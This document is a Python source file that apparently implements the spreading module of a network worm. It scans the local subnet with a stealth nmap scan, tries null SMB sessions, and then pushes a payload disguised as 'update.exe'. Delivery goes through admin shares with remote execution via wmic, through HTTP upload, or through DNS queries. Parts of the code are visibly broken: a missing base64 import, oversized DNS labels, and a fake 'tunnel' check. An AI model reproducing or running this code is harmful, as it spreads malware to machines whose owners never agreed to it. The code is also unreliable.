import os
import sys
import socket
import struct
import random
import threading
import subprocess
import netifaces
import nmap
import scapy.all as scapy
from scapy.layers.inet import IP, TCP, UDP
from uuid import uuid4

class NetworkOperations:
    def __init__(self):
        self.nodes = {}  # {node_id: node_info}
        self.routes = {}  # {source: {target: route}}
        self.interfaces = self.get_interfaces()
        self.node_id = str(uuid4())
        
    def get_interfaces(self):
        """Get all network interfaces"""
        interfaces = {}
        for iface in netifaces.interfaces():
            try:
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    interfaces[iface] = addrs[netifaces.AF_INET][0]
            except:
                continue
        return interfaces
        
    def scan_network(self, target_range=None):
        """Scan network for potential targets"""
        if not target_range:
            # Get local network range
            for iface, addr in self.interfaces.items():
                if 'addr' in addr and 'netmask' in addr:
                    ip = addr['addr']
                    if not ip.startswith('127.'):
                        target_range = f"{ip.rsplit('.', 1)[0]}.0/24"
                        break
                        
        if not target_range:
            return []
            
        try:
            # Use nmap for stealth scan
            nm = nmap.PortScanner()
            nm.scan(hosts=target_range, arguments='-sS -sV -O -T4 --version-intensity 5')
            
            discovered_hosts = []
            for host in nm.all_hosts():
                if nm[host].state() == 'up':
                    host_info = {
                        'ip': host,
                        'os': nm[host].get('osmatch', []),
                        'ports': nm[host]['tcp'] if 'tcp' in nm[host] else {},
                        'hostname': nm[host].hostname()
                    }
                    discovered_hosts.append(host_info)
                    
            return discovered_hosts
        except:
            # Fallback to basic ping sweep
            return self._ping_sweep(target_range)
            
    def _ping_sweep(self, target_range):
        """Basic ping sweep using scapy"""
        try:
            ans, unans = scapy.srp(
                scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=target_range),
                timeout=2,
                verbose=False
            )
            
            discovered_hosts = []
            for sent, received in ans:
                host_info = {
                    'ip': received.psrc,
                    'mac': received.hwsrc,
                    'os': 'Unknown',
                    'ports': {}
                }
                discovered_hosts.append(host_info)
                
            return discovered_hosts
        except:
            return []
            
    def establish_p2p(self, target_info):
        """Establish P2P connection with target"""
        try:
            # Try multiple connection methods
            connected = False
            
            # Try SMB
            if 445 in target_info.get('ports', {}):
                connected = self._connect_smb(target_info['ip'])
                
            # Try HTTP(S)
            if not connected and (80 in target_info.get('ports', {}) or 
                                443 in target_info.get('ports', {})):
                connected = self._connect_http(target_info['ip'])
                
            # Try DNS
            if not connected:
                connected = self._connect_dns(target_info['ip'])
                
            if connected:
                self.nodes[target_info['ip']] = target_info
                self._update_routes()
                
            return connected
        except:
            return False
            
    def _connect_smb(self, target_ip):
        """Establish connection via SMB"""
        try:
            # Use native Windows SMB or smbclient
            if os.name == 'nt':
                cmd = f'net use \\\\{target_ip}\\IPC$ "" /u:""'
            else:
                cmd = f'smbclient -N -L \\\\{target_ip}'
                
            result = subprocess.run(cmd, shell=True, capture_output=True)
            return result.returncode == 0
        except:
            return False
            
    def _connect_http(self, target_ip):
        """Establish connection via HTTP(S)"""
        import requests
        try:
            # Try HTTPS first
            response = requests.get(f'https://{target_ip}', verify=False, timeout=5)
            return response.status_code == 200
        except:
            try:
                # Fallback to HTTP
                response = requests.get(f'http://{target_ip}', timeout=5)
                return response.status_code == 200
            except:
                return False
                
    def _connect_dns(self, target_ip):
        """Establish connection via DNS tunneling"""
        try:
            # Create DNS tunnel
            tunnel = scapy.IP(dst=target_ip)/UDP(dport=53)
            response = scapy.sr1(tunnel, timeout=2, verbose=False)
            return response is not None
        except:
            return False
            
    def _update_routes(self):
        """Update routing table"""
        for source in self.nodes:
            self.routes[source] = {}
            for target in self.nodes:
                if source != target:
                    # Find best route (implement routing algorithm here)
                    route = self._find_route(source, target)
                    if route:
                        self.routes[source][target] = route
                        
    def _find_route(self, source, target):
        """Find best route between nodes"""
        # Implement routing algorithm (e.g., Dijkstra's)
        # For now, return direct route
        return [source, target]
        
    def propagate(self, payload_data):
        """Propagate to other systems"""
        success = []
        for target_info in self.nodes.values():
            try:
                if self._deploy_payload(target_info, payload_data):
                    success.append(target_info['ip'])
            except:
                continue
        return success
        
    def _deploy_payload(self, target_info, payload_data):
        """Deploy payload to target system"""
        try:
            # Try multiple deployment methods
            if 445 in target_info.get('ports', {}):
                return self._deploy_smb(target_info['ip'], payload_data)
            elif 80 in target_info.get('ports', {}) or 443 in target_info.get('ports', {}):
                return self._deploy_http(target_info['ip'], payload_data)
            else:
                return self._deploy_dns(target_info['ip'], payload_data)
        except:
            return False
            
    def _deploy_smb(self, target_ip, payload_data):
        """Deploy via SMB"""
        try:
            share_path = f'\\\\{target_ip}\\C$\\Windows\\Temp'
            temp_file = os.path.join(share_path, f'update_{random.randint(1000, 9999)}.exe')
            
            with open(temp_file, 'wb') as f:
                f.write(payload_data)
                
            # Execute remotely
            cmd = f'wmic /node:"{target_ip}" process call create "{temp_file}"'
            result = subprocess.run(cmd, shell=True, capture_output=True)
            
            return result.returncode == 0
        except:
            return False
            
    def _deploy_http(self, target_ip, payload_data):
        """Deploy via HTTP"""
        import requests
        try:
            response = requests.post(
                f'http://{target_ip}/upload',
                files={'file': ('update.exe', payload_data)},
                timeout=10
            )
            return response.status_code == 200
        except:
            return False
            
    def _deploy_dns(self, target_ip, payload_data):
        """Deploy via DNS tunneling"""
        try:
            # Split payload into chunks
            chunk_size = 200  # DNS label size limit
            chunks = [payload_data[i:i+chunk_size] for i in range(0, len(payload_data), chunk_size)]
            
            for i, chunk in enumerate(chunks):
                # Encode chunk in DNS query
                query = scapy.IP(dst=target_ip)/UDP(dport=53)/scapy.DNS(
                    qd=scapy.DNSQR(qname=f"{i}.{base64.b32encode(chunk).decode()}.local")
                )
                scapy.send(query, verbose=False)
                
            return True
        except:
            return False
